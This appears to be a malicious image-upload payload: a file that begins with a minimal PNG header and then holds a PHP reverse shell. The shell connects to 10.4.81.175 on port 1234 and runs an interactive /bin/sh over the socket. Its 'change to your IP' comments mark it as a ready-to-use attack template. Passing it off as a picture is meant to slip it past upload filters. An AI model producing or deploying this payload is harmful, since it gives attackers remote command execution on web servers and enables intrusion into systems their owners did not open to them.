�PNG

   IHDR         �wS�    IEND�B`�
<?php
$ip = '10.4.81.175'; // Change to your IP
$port = 1234; // Change to your listening port
$sock = fsockopen($ip, $port);
exec('/bin/sh -i <&3 >&3 2>&3');
?>